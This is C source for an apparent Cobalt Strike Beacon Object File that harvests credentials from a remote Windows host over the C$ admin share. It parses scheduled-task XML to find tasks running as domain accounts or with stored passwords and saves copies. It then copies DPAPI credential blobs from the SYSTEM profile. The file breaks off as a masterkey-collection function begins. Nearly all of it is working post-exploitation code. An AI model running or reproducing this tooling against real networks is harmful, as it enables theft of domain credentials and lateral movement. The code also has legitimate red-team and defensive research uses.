#include <windows.h>
#include "../_include/beacon.h"

// Constants
#define MAX_PATH_LENGTH 1024
#define MAX_BUFFER_SIZE 8192
#define MAX_STRING_LENGTH 512
#define MAX_OUTPUT_LINE_SIZE 2048
#define MAX_FILE_SIZE 1048576  // 1MB file size limit
#define UTF16_BOM_SIZE 2
#define XML_BOM_CHECK_SIZE 1000

// Prevent any accidental use of C library functions
#define strlen bof_strlen

// ============================================================================
// Windows API Function Pointers
// ============================================================================

// MPR.dll (Network Resource API)
typedef DWORD (WINAPI *pWNetAddConnection2A)(LPNETRESOURCEA, LPCSTR, LPCSTR, DWORD);
typedef DWORD (WINAPI *pWNetCancelConnection2A)(LPCSTR, DWORD, BOOL);

// KERNEL32.dll (File System & Memory Management)
typedef HANDLE (WINAPI *pFindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL (WINAPI *pFindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL (WINAPI *pFindClose)(HANDLE);
typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
typedef DWORD (WINAPI *pGetFileSize)(HANDLE, LPDWORD);
typedef BOOL (WINAPI *pCreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES);
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef DWORD (WINAPI *pGetLastError)(VOID);

// ============================================================================
// String Utility Functions
// ============================================================================

/**
 * Safe string length calculation with bounds checking
 */
int bof_strlen(const char* str) {
    if (!str) return 0;
    int len = 0;
    while (str[len] && len < MAX_STRING_LENGTH) len++;
    return len;
}

/**
 * Safe string copy with bounds checking
 */
BOOL bof_strcpy_safe(char* dest, const char* src, int dest_size) {
    if (!dest || !src || dest_size <= 0) return FALSE;
    
    int i = 0;
    while (src[i] && i < (dest_size - 1)) {
        dest[i] = src[i];
        i++;
    }
    dest[i] = '\0';
    return TRUE;
}

/**
 * Safe string concatenation with bounds checking
 */
BOOL bof_strcat_safe(char* dest, const char* src, int dest_size) {
    if (!dest || !src || dest_size <= 0) return FALSE;
    
    int dest_len = bof_strlen(dest);
    int remaining = dest_size - dest_len - 1;
    
    if (remaining <= 0) return FALSE;
    
    int i = 0;
    while (src[i] && i < remaining) {
        dest[dest_len + i] = src[i];
        i++;
    }
    dest[dest_len + i] = '\0';
    return TRUE;
}

/**
 * String comparison function
 */
int bof_strcmp(const char* s1, const char* s2) {
    if (!s1 || !s2) return s1 ? 1 : (s2 ? -1 : 0);
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(unsigned char*)s1 - *(unsigned char*)s2;
}

/**
 * Memory initialization function
 */
void bof_memset(void* ptr, int value, size_t num) {
    if (!ptr) return;
    unsigned char* p = (unsigned char*)ptr;
    while (num--) *p++ = (unsigned char)value;
}

/**
 * String search function
 */
char* bof_strstr(const char* haystack, const char* needle) {
    if (!needle || !haystack) return NULL;
    
    int needle_len = (int)bof_strlen(needle);
    if (needle_len == 0) return (char*)haystack;
    
    for (const char* p = haystack; *p; p++) {
        int i;
        for (i = 0; i < needle_len && p[i] == needle[i]; i++);
        if (i == needle_len) {
            return (char*)p;
        }
    }
    return NULL;
}

// Convert string to uppercase (in-place)
void bof_strupper(char* str) {
    while (*str) {
        if (*str >= 'a' && *str <= 'z') {
            *str = *str - 'a' + 'A';
        }
        str++;
    }
}

// Check if a RunAs value appears to represent a domain account (not local/system)
BOOL looks_like_domain_user(const char* runas) {
    if (!runas || bof_strlen(runas) == 0) return FALSE;
    
    char temp[512];
    if (!bof_strcpy_safe(temp, runas, sizeof(temp))) return FALSE;
    bof_strupper(temp);
    
    // Exclude well-known local SIDs (SYSTEM, LOCAL SERVICE, NETWORK SERVICE)
    if (bof_strstr(temp, "S-1-5-18") || bof_strstr(temp, "S-1-5-19") || bof_strstr(temp, "S-1-5-20")) {
        return FALSE;
    }
    
    // If username contains a backslash (DOMAIN\user), treat as domain account
    if (bof_strstr(temp, "\\")) {
        return TRUE;
    }
    
    // If it looks like a UPN (user@domain.com), treat as domain user
    if (bof_strstr(temp, "@") || bof_strstr(temp, ".")) {
        return TRUE;
    }
    
    return FALSE;
}

// Function prototype
void go(char* args, int len);

// Helper functions for XML parsing
char* find_xml_value(char* xml, const char* tag_name, pVirtualAlloc fpVirtualAlloc) {
    char start_tag[64];
    char end_tag[64];
    
    // Build start and end tags
    if (!bof_strcpy_safe(start_tag, "<", sizeof(start_tag))) return NULL;
    if (!bof_strcat_safe(start_tag, tag_name, sizeof(start_tag))) return NULL;
    if (!bof_strcat_safe(start_tag, ">", sizeof(start_tag))) return NULL;
    
    if (!bof_strcpy_safe(end_tag, "</", sizeof(end_tag))) return NULL;
    if (!bof_strcat_safe(end_tag, tag_name, sizeof(end_tag))) return NULL;
    if (!bof_strcat_safe(end_tag, ">", sizeof(end_tag))) return NULL;
    
    // Find start tag
    char* start_pos = bof_strstr(xml, start_tag);
    if (!start_pos) return NULL;
    
    start_pos += bof_strlen(start_tag);
    
    // Find end tag
    char* end_pos = bof_strstr(start_pos, end_tag);
    if (!end_pos) return NULL;
    
    // Allocate and copy the value
    int value_len = (int)(end_pos - start_pos);
    char* value = (char*)fpVirtualAlloc(NULL, value_len + 1, MEM_COMMIT, PAGE_READWRITE);
    if (value) {
        int i;
        for (i = 0; i < value_len; i++) {
            value[i] = start_pos[i];
        }
        value[value_len] = '\0';
    }
    
    return value;
}

// ============================================================================
// File System Helper Functions
// ============================================================================

/**
 * Builds directory path with proper backslash handling
 */
BOOL build_directory_path(char* dest, const char* base_path, const char* sub_path, int dest_size) {
    if (!dest || !base_path || !sub_path || dest_size <= 0) return FALSE;
    
    if (!bof_strcpy_safe(dest, base_path, dest_size)) return FALSE;
    
    // Check if base_path already ends with backslash
    int base_len = bof_strlen(base_path);
    if (base_len > 0 && base_path[base_len - 1] != '\\') {
        if (!bof_strcat_safe(dest, "\\", dest_size)) return FALSE;
    }
    
    return bof_strcat_safe(dest, sub_path, dest_size);
}

/**
 * Creates directory structure recursively for offline mode compatibility
 */
BOOL create_task_directory_structure(const char* save_dir, const char* target_host, 
                                   pCreateDirectoryA fpCreateDirectoryA, char* final_path, int final_path_size) {
    if (!save_dir || !target_host || !fpCreateDirectoryA || !final_path || final_path_size <= 0) {
        return FALSE;
    }
    
    char temp_path[MAX_PATH_LENGTH];
    
    // First create the save_dir if it doesn't exist
    fpCreateDirectoryA(save_dir, NULL);
    
    // Create save_dir\hostname
    if (!build_directory_path(temp_path, save_dir, target_host, sizeof(temp_path))) return FALSE;
    fpCreateDirectoryA(temp_path, NULL);
    
    // Create save_dir\hostname\Windows
    if (!bof_strcat_safe(temp_path, "\\Windows", sizeof(temp_path))) return FALSE;
    fpCreateDirectoryA(temp_path, NULL);
    
    // Create save_dir\hostname\Windows\System32
    if (!bof_strcat_safe(temp_path, "\\System32", sizeof(temp_path))) return FALSE;
    fpCreateDirectoryA(temp_path, NULL);
    
    // Create save_dir\hostname\Windows\System32\Tasks
    if (!bof_strcat_safe(temp_path, "\\Tasks", sizeof(temp_path))) return FALSE;
    fpCreateDirectoryA(temp_path, NULL);
    
    // Copy final path to output
    return bof_strcpy_safe(final_path, temp_path, final_path_size);
}

/**
 * Writes raw buffer content to file with error handling
 */
BOOL write_raw_file(const char* file_path, const char* raw_content, DWORD content_length, 
                   pCreateFileA fpCreateFileA, pWriteFile fpWriteFile, 
                   pCloseHandle fpCloseHandle, pGetLastError fpGetLastError) {
    if (!file_path || !raw_content || content_length == 0) return FALSE;
    
    HANDLE hFile = fpCreateFileA(file_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD error = fpGetLastError();
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateFile failed for %s (Error: %d)\n", file_path, error);
        return FALSE;
    }
    
    // Write raw content (preserves UTF-16 BOM and original encoding)
    DWORD bytes_written;
    BOOL result = fpWriteFile(hFile, raw_content, content_length, &bytes_written, NULL);
    
    if (!result) {
        DWORD error = fpGetLastError();
        BeaconPrintf(CALLBACK_ERROR, "[-] WriteFile failed for %s (Error: %d)\n", file_path, error);
    } else if (bytes_written != content_length) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Partial write for %s (%d/%d bytes)\n", file_path, bytes_written, content_length);
        result = FALSE;
    }
    
    fpCloseHandle(hFile);
    return result;
}

/**
 * Writes XML content to file with error handling
 */
BOOL write_xml_file(const char* file_path, const char* xml_content, 
                   pCreateFileA fpCreateFileA, pWriteFile fpWriteFile, 
                   pCloseHandle fpCloseHandle, pGetLastError fpGetLastError) {
    if (!file_path || !xml_content) return FALSE;
    
    HANDLE hFile = fpCreateFileA(file_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD error = fpGetLastError();
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateFile failed for %s (Error: %d)\n", file_path, error);
        return FALSE;
    }
    
    // Write content
    DWORD content_len = (DWORD)bof_strlen(xml_content);
    DWORD bytes_written;
    BOOL result = fpWriteFile(hFile, xml_content, content_len, &bytes_written, NULL);
    
    if (!result) {
        DWORD error = fpGetLastError();
        BeaconPrintf(CALLBACK_ERROR, "[-] WriteFile failed for %s (Error: %d)\n", file_path, error);
    } else if (bytes_written != content_len) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Partial write for %s (%d/%d bytes)\n", file_path, bytes_written, content_len);
        result = FALSE;
    }
    
    fpCloseHandle(hFile);
    return result;
}

/**
 * Main function to save task XML with proper directory structure
 */
BOOL save_task_xml(char* save_dir, char* target_host, char* task_name, char* xml_content, 
                   pCreateFileA fpCreateFileA, pWriteFile fpWriteFile, pCloseHandle fpCloseHandle,
                   pCreateDirectoryA fpCreateDirectoryA, pGetLastError fpGetLastError) {
    
    if (!save_dir || !target_host || !task_name || !xml_content) return FALSE;
    
    char tasks_dir_path[MAX_PATH_LENGTH];
    char file_path[MAX_PATH_LENGTH];
    
    // Create the complete directory structure
    if (!create_task_directory_structure(save_dir, target_host, fpCreateDirectoryA, 
                                        tasks_dir_path, sizeof(tasks_dir_path))) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create directory structure\n");
        return FALSE;
    }
    
    // Build complete file path
    if (!build_directory_path(file_path, tasks_dir_path, task_name, sizeof(file_path))) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build file path\n");
        return FALSE;
    }
    
    // Write the XML file
    return write_xml_file(file_path, xml_content, fpCreateFileA, fpWriteFile, 
                         fpCloseHandle, fpGetLastError);
}

/**
 * Saves raw task XML buffer to file with proper directory structure (for offline compatibility)
 */
BOOL save_raw_task_xml(char* save_dir, char* target_host, const char* task_name, char* raw_buffer, DWORD buffer_size,
                      pCreateFileA fpCreateFileA, pWriteFile fpWriteFile, pCloseHandle fpCloseHandle,
                      pCreateDirectoryA fpCreateDirectoryA, pGetLastError fpGetLastError) {
    
    if (!save_dir || !target_host || !task_name || !raw_buffer || buffer_size == 0) return FALSE;
    
    char tasks_dir_path[MAX_PATH_LENGTH];
    char file_path[MAX_PATH_LENGTH];
    
    // Create the complete directory structure
    if (!create_task_directory_structure(save_dir, target_host, fpCreateDirectoryA, 
                                        tasks_dir_path, sizeof(tasks_dir_path))) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create directory structure\n");
        return FALSE;
    }
    
    // Build complete file path
    if (!build_directory_path(file_path, tasks_dir_path, task_name, sizeof(file_path))) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build file path\n");
        return FALSE;
    }
    
    // Write the raw XML file (preserves original encoding including UTF-16 BOM)
    return write_raw_file(file_path, raw_buffer, buffer_size, fpCreateFileA, fpWriteFile, 
                         fpCloseHandle, fpGetLastError);
}

// ============================================================================
// XML Processing Functions
// ============================================================================

/**
 * Detects UTF-16 BOM and converts content to ASCII if needed
 */
char* process_xml_encoding(char* buffer, DWORD bytes_read, pVirtualAlloc fpVirtualAlloc) {
    if (!buffer || bytes_read == 0) return NULL;
    
    char* xml_content = NULL;
    
    // Check if file is UTF-16 encoded (BOM: FF FE)
    if (bytes_read >= UTF16_BOM_SIZE && 
        (unsigned char)buffer[0] == 0xFF && (unsigned char)buffer[1] == 0xFE) {
        
        // UTF-16LE BOM detected - convert to ASCII
        xml_content = (char*)fpVirtualAlloc(NULL, (bytes_read / 2) + 1, MEM_COMMIT, PAGE_READWRITE);
        if (xml_content) {
            int ascii_pos = 0;
            for (int i = UTF16_BOM_SIZE; i < (int)bytes_read; i += 2) {
                char c = buffer[i];
                // Keep all valid XML characters including special XML chars like <, >, =, ", /, ?, etc.
                // and printable ASCII plus essential whitespace and control chars
                if (c != '\0') {  // Just exclude null bytes, keep everything else
                    xml_content[ascii_pos++] = c;
                }
            }
            xml_content[ascii_pos] = '\0';
        }
    } else {
        // Regular ASCII/UTF-8 content - make a copy
        xml_content = (char*)fpVirtualAlloc(NULL, bytes_read + 1, MEM_COMMIT, PAGE_READWRITE);
        if (xml_content) {
            for (int i = 0; i < (int)bytes_read; i++) {
                xml_content[i] = buffer[i];
            }
            xml_content[bytes_read] = '\0';
        }
    }
    
    return xml_content;
}

/**
 * Checks if task has stored credentials based on logon type
 */
BOOL task_has_stored_credentials(const char* logon_type) {
    if (!logon_type) return FALSE;
    return bof_strcmp(logon_type, "Password") == 0;
}

/**
 * Extracts all relevant XML values from task content
 */
typedef struct {
    char* run_as;
    char* command;
    char* arguments;
    char* author;
    char* date;
    char* logon_type;
    char* run_level;
    BOOL has_stored_creds;
} TaskInfo;

BOOL parse_task_xml(char* xml_content, TaskInfo* task_info, pVirtualAlloc fpVirtualAlloc) {
    if (!xml_content || !task_info) return FALSE;
    
    bof_memset(task_info, 0, sizeof(TaskInfo));
    
    // Parse XML for key information
    task_info->run_as = find_xml_value(xml_content, "UserId", fpVirtualAlloc);
    task_info->command = find_xml_value(xml_content, "Command", fpVirtualAlloc);
    task_info->arguments = find_xml_value(xml_content, "Arguments", fpVirtualAlloc);
    task_info->author = find_xml_value(xml_content, "Author", fpVirtualAlloc);
    task_info->date = find_xml_value(xml_content, "Date", fpVirtualAlloc);
    task_info->logon_type = find_xml_value(xml_content, "LogonType", fpVirtualAlloc);
    task_info->run_level = find_xml_value(xml_content, "RunLevel", fpVirtualAlloc);
    
    // Determine if task has stored credentials
    task_info->has_stored_creds = task_has_stored_credentials(task_info->logon_type);
    
    return TRUE;
}

/**
 * Cleans up allocated task info memory
 */
void cleanup_task_info(TaskInfo* task_info, pVirtualFree fpVirtualFree) {
    if (!task_info) return;
    
    if (task_info->run_as) fpVirtualFree(task_info->run_as, 0, MEM_RELEASE);
    if (task_info->command) fpVirtualFree(task_info->command, 0, MEM_RELEASE);
    if (task_info->arguments) fpVirtualFree(task_info->arguments, 0, MEM_RELEASE);
    if (task_info->author) fpVirtualFree(task_info->author, 0, MEM_RELEASE);
    if (task_info->date) fpVirtualFree(task_info->date, 0, MEM_RELEASE);
    if (task_info->logon_type) fpVirtualFree(task_info->logon_type, 0, MEM_RELEASE);
    if (task_info->run_level) fpVirtualFree(task_info->run_level, 0, MEM_RELEASE);
    
    bof_memset(task_info, 0, sizeof(TaskInfo));
}

/**
 * Process individual task file and return whether it should be counted
 */
BOOL process_task_file(const char* file_path, const char* file_name, char* target, 
                      char* save_dir, BOOL show_unsaved_creds, DWORD file_size,
                      pCreateFileA fpCreateFileA, pReadFile fpReadFile, pCloseHandle fpCloseHandle,
                      pVirtualAlloc fpVirtualAlloc, pVirtualFree fpVirtualFree,
                      pWriteFile fpWriteFile, pCreateDirectoryA fpCreateDirectoryA, 
                      pGetLastError fpGetLastError) {
    
    char* buffer = NULL;
    
    HANDLE hFile = fpCreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Could not read: %s\n", file_name);
        return FALSE;
    }
    
    if (file_size == INVALID_FILE_SIZE || file_size >= MAX_FILE_SIZE) {
        fpCloseHandle(hFile);
        return FALSE;
    }
    
    // Allocate buffer
    buffer = (char*)fpVirtualAlloc(NULL, file_size + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!buffer) {
        fpCloseHandle(hFile);
        return FALSE;
    }
    
    DWORD bytes_read = 0;
    if (!fpReadFile(hFile, buffer, file_size, &bytes_read, NULL)) {
        fpVirtualFree(buffer, 0, MEM_RELEASE);
        fpCloseHandle(hFile);
        return FALSE;
    }
    
    fpCloseHandle(hFile);
    buffer[bytes_read] = '\0';
    
    // Process XML content
    char* xml_content = process_xml_encoding(buffer, bytes_read, fpVirtualAlloc);
    if (!xml_content) {
        fpVirtualFree(buffer, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Parse XML using TaskInfo structure
    TaskInfo task_info;
    if (!parse_task_xml(xml_content, &task_info, fpVirtualAlloc)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse task XML: %s\n", file_name);
        fpVirtualFree(xml_content, 0, MEM_RELEASE);
        fpVirtualFree(buffer, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Apply filtering logic
    BOOL should_display = FALSE;
    if (task_info.run_as) {
        BOOL has_stored_creds = task_info.has_stored_creds;
        
        // Show task if it's a domain user OR if it has stored credentials
        if (looks_like_domain_user(task_info.run_as) || has_stored_creds) {
            // Only show if they have stored creds OR unsaved-creds flag is set
            if (has_stored_creds || show_unsaved_creds) {
                should_display = TRUE;
            }
        }
    }
    
    BOOL task_processed = FALSE;
    if (should_display) {
        // Save file if save directory specified (only save filtered tasks)
        if (save_dir) {
            if (save_raw_task_xml(save_dir, target, file_name, buffer, bytes_read, fpCreateFileA, 
                                fpWriteFile, fpCloseHandle, fpCreateDirectoryA, fpGetLastError)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Saved: %s\\%s\\Windows\\System32\\Tasks\\%s\n", save_dir, target, file_name);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to save: %s\\%s\\Windows\\System32\\Tasks\\%s\n", save_dir, target, file_name);
            }
        }
        
        // Format output line
        char output_line[MAX_OUTPUT_LINE_SIZE];
        if (bof_strcpy_safe(output_line, file_name, sizeof(output_line)) &&
            bof_strcat_safe(output_line, ": ", sizeof(output_line))) {
            
            if (task_info.run_as) {
                bof_strcat_safe(output_line, task_info.run_as, sizeof(output_line));
                bof_strcat_safe(output_line, " is executing ", sizeof(output_line));
            }
            
            if (task_info.command) {
                bof_strcat_safe(output_line, task_info.command, sizeof(output_line));
                if (task_info.arguments) {
                    bof_strcat_safe(output_line, " ", sizeof(output_line));
                    bof_strcat_safe(output_line, task_info.arguments, sizeof(output_line));
                }
            }
            
            // Add credential type indicator
            if (task_info.logon_type) {
                const char* cred_indicator = task_info.has_stored_creds ? " [STORED CREDS]" : " [INTERACTIVE TOKEN]";
                bof_strcat_safe(output_line, cred_indicator, sizeof(output_line));
            }
            
            BeaconPrintf(CALLBACK_OUTPUT, "%s\n", output_line);
            task_processed = TRUE;
        }
    }
    
    // Cleanup
    cleanup_task_info(&task_info, fpVirtualFree);
    fpVirtualFree(xml_content, 0, MEM_RELEASE);
    fpVirtualFree(buffer, 0, MEM_RELEASE);
    
    return task_processed;
}

/**
 * Recursively traverse directories and process task files
 */
int traverse_task_directory(const char* base_path, const char* current_subdir, char* target, 
                           char* save_dir, BOOL show_unsaved_creds,
                           pFindFirstFileA fpFindFirstFileA, pFindNextFileA fpFindNextFileA, 
                           pFindClose fpFindClose, pCreateFileA fpCreateFileA, pReadFile fpReadFile,
                           pCloseHandle fpCloseHandle, pGetFileSize fpGetFileSize,
                           pVirtualAlloc fpVirtualAlloc, pVirtualFree fpVirtualFree,
                           pWriteFile fpWriteFile, pCreateDirectoryA fpCreateDirectoryA, 
                           pGetLastError fpGetLastError) {
    
    char search_path[MAX_PATH_LENGTH];
    char current_dir_path[MAX_PATH_LENGTH];
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind;
    int task_count = 0;
    
    // Build the current directory path
    if (!bof_strcpy_safe(current_dir_path, base_path, sizeof(current_dir_path))) return 0;
    if (current_subdir && bof_strlen(current_subdir) > 0) {
        if (!bof_strcat_safe(current_dir_path, "\\", sizeof(current_dir_path)) ||
            !bof_strcat_safe(current_dir_path, current_subdir, sizeof(current_dir_path))) return 0;
    }
    
    // Build search path for all files and directories in current directory
    if (!bof_strcpy_safe(search_path, current_dir_path, sizeof(search_path)) ||
        !bof_strcat_safe(search_path, "\\*", sizeof(search_path))) return 0;
    
    hFind = fpFindFirstFileA(search_path, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    do {
        // Skip . and .. entries
        if (bof_strcmp(findFileData.cFileName, ".") == 0 || 
            bof_strcmp(findFileData.cFileName, "..") == 0) {
            continue;
        }
        
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // This is a subdirectory - recurse into it
            char subdir_path[MAX_PATH_LENGTH];
            if (current_subdir && bof_strlen(current_subdir) > 0) {
                if (bof_strcpy_safe(subdir_path, current_subdir, sizeof(subdir_path)) &&
                    bof_strcat_safe(subdir_path, "\\", sizeof(subdir_path)) &&
                    bof_strcat_safe(subdir_path, findFileData.cFileName, sizeof(subdir_path))) {
                    task_count += traverse_task_directory(base_path, subdir_path, target, save_dir, show_unsaved_creds,
                                                        fpFindFirstFileA, fpFindNextFileA, fpFindClose, 
                                                        fpCreateFileA, fpReadFile, fpCloseHandle, fpGetFileSize,
                                                        fpVirtualAlloc, fpVirtualFree, fpWriteFile, 
                                                        fpCreateDirectoryA, fpGetLastError);
                }
            } else {
                task_count += traverse_task_directory(base_path, findFileData.cFileName, target, save_dir, show_unsaved_creds,
                                                    fpFindFirstFileA, fpFindNextFileA, fpFindClose, 
                                                    fpCreateFileA, fpReadFile, fpCloseHandle, fpGetFileSize,
                                                    fpVirtualAlloc, fpVirtualFree, fpWriteFile, 
                                                    fpCreateDirectoryA, fpGetLastError);
            }
        } else {
            // This is a file - skip system files and process task files
            if (bof_strcmp(findFileData.cFileName, "desktop.ini") == 0) {
                continue;
            }
            
            // Build full path to the file
            char full_path[MAX_PATH_LENGTH];
            if (!bof_strcpy_safe(full_path, current_dir_path, sizeof(full_path)) ||
                !bof_strcat_safe(full_path, "\\", sizeof(full_path)) ||
                !bof_strcat_safe(full_path, findFileData.cFileName, sizeof(full_path))) {
                continue;
            }
            
            // Get file size
            HANDLE hFile = fpCreateFileA(full_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD file_size = fpGetFileSize(hFile, NULL);
                fpCloseHandle(hFile);
                
                // Process the task file (allocates its own buffer internally)
                if (process_task_file(full_path, findFileData.cFileName, target, save_dir, show_unsaved_creds,
                                    file_size, fpCreateFileA, fpReadFile, fpCloseHandle,
                                    fpVirtualAlloc, fpVirtualFree, fpWriteFile, fpCreateDirectoryA, fpGetLastError)) {
                    task_count++;
                }
            }
        }
    } while (fpFindNextFileA(hFind, &findFileData) != 0);
    
    fpFindClose(hFind);
    return task_count;
}

// ============================================================================
// DPAPI Credential & Masterkey Collection Functions
// ============================================================================

/**
 * Creates directory structure for saving credential blobs
 * Creates: save_dir\hostname\credentials
 */
BOOL create_credentials_directory(const char* save_dir, const char* target_host,
                                 pCreateDirectoryA fpCreateDirectoryA, char* final_path, int final_path_size) {
    if (!save_dir || !target_host || !fpCreateDirectoryA || !final_path || final_path_size <= 0) {
        return FALSE;
    }
    
    char temp_path[MAX_PATH_LENGTH];
    
    // First create the save_dir if it doesn't exist
    fpCreateDirectoryA(save_dir, NULL);
    
    // Create save_dir\hostname
    if (!build_directory_path(temp_path, save_dir, target_host, sizeof(temp_path))) return FALSE;
    fpCreateDirectoryA(temp_path, NULL);
    
    // Create save_dir\hostname\credentials
    if (!bof_strcat_safe(temp_path, "\\credentials", sizeof(temp_path))) return FALSE;
    fpCreateDirectoryA(temp_path, NULL);
    
    // Copy final path to output
    return bof_strcpy_safe(final_path, temp_path, final_path_size);
}

/**
 * Creates directory structure for saving masterkeys
 * Creates: save_dir\hostname\masterkeys
 */
BOOL create_masterkeys_directory(const char* save_dir, const char* target_host,
                                pCreateDirectoryA fpCreateDirectoryA, char* final_path, int final_path_size) {
    if (!save_dir || !target_host || !fpCreateDirectoryA || !final_path || final_path_size <= 0) {
        return FALSE;
    }
    
    char temp_path[MAX_PATH_LENGTH];
    
    // First create the save_dir if it doesn't exist
    fpCreateDirectoryA(save_dir, NULL);
    
    // Create save_dir\hostname
    if (!build_directory_path(temp_path, save_dir, target_host, sizeof(temp_path))) return FALSE;
    fpCreateDirectoryA(temp_path, NULL);
    
    // Create save_dir\hostname\masterkeys
    if (!bof_strcat_safe(temp_path, "\\masterkeys", sizeof(temp_path))) return FALSE;
    fpCreateDirectoryA(temp_path, NULL);
    
    // Copy final path to output
    return bof_strcpy_safe(final_path, temp_path, final_path_size);
}

/**
 * Collects all credential blobs from remote system
 * Path: \\target\C$\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\*
 */
int collect_credential_blobs(const char* remote_path, const char* target, const char* save_dir,
                            pFindFirstFileA fpFindFirstFileA, pFindNextFileA fpFindNextFileA,
                            pFindClose fpFindClose, pCreateFileA fpCreateFileA,
                            pReadFile fpReadFile, pCloseHandle fpCloseHandle,
                            pGetFileSize fpGetFileSize, pVirtualAlloc fpVirtualAlloc,
                            pVirtualFree fpVirtualFree, pWriteFile fpWriteFile,
                            pCreateDirectoryA fpCreateDirectoryA, pGetLastError fpGetLastError) {
    
    WIN32_FIND_DATAA findFileData;
    char search_path[MAX_PATH_LENGTH];
    char full_path[MAX_PATH_LENGTH];
    char save_path[MAX_PATH_LENGTH];
    char creds_dir[MAX_PATH_LENGTH];
    int blob_count = 0;
    
    // Build credential blobs path: \\target\C$\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\*
    if (!bof_strcpy_safe(search_path, remote_path, sizeof(search_path))) return 0;
    if (!bof_strcat_safe(search_path, "\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\*", sizeof(search_path))) return 0;
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Enumerating credential blobs...\n");
    
    HANDLE hFind = fpFindFirstFileA(search_path, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enumerate credential blobs (Error: %d)\n", fpGetLastError());
        return 0;
    }
    
    // Create credentials save directory
    if (!create_credentials_directory(save_dir, target, fpCreateDirectoryA, creds_dir, sizeof(creds_dir))) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create credentials directory\n");
        fpFindClose(hFind);
        return 0;
    }
    
    do {
        // Skip directories and special entries
        if (findFileData.cFileName[0] == '.' ||
            (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            continue;
        }
        
        // Only process small files (credential blobs are typically < 10KB)
        DWORD file_size = findFileData.nFileSizeLow;
        if (file_size > 10000 || file_size == 0) {
            continue;
        }
        
        // Build full remote path
        if (!bof_strcpy_safe(full_path, remote_path, sizeof(full_path))) continue;
        if (!bof_strcat_safe(full_path, "\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\", sizeof(full_path))) continue;
        if (!bof_strcat_safe(full_path, findFileData.cFileName, sizeof(full_path))) continue;
        
        // Read the credential blob file
        HANDLE hFile = fpCreateFileA(full_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            continue;
        }
        
        // Allocate buffer for file content
        char* buffer = (char*)fpVirtualAlloc(NULL, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) {
            fpCloseHandle(hFile);
            continue;
        }
        
        // Read file content
        DWORD bytes_read;
        if (!fpReadFile(hFile, buffer, file_size, &bytes_read, NULL) || bytes_read != file_size) {
            fpVirtualFree(buffer, 0, MEM_RELEASE);
            fpCloseHandle(hFile);
            continue;
        }
        fpCloseHandle(hFile);
        
        // Build save path
        if (!build_directory_path(save_path, creds_dir, findFileData.cFileName, sizeof(save_path))) {
            fpVirtualFree(buffer, 0, MEM_RELEASE);
            continue;
        }
        
        // Write the blob file
        if (write_raw_file(save_path, buffer, file_size, fpCreateFileA, fpWriteFile, fpCloseHandle, fpGetLastError)) {
            blob_count++;
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Collected credential blob: %s (%d bytes)\n", findFileData.cFileName, file_size);
        }
        
        fpVirtualFree(buffer, 0, MEM_RELEASE);
        
    } while (fpFindNextFileA(hFind, &findFileData) != 0);
    
    fpFindClose(hFind);
    return blob_count;
}

/**
 * Collects all SYSTEM masterkeys from remote system
 * Path: \\target\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\*
 */
int collect_masterkeys(const char* remote_path, const char* target, const char* save_dir,
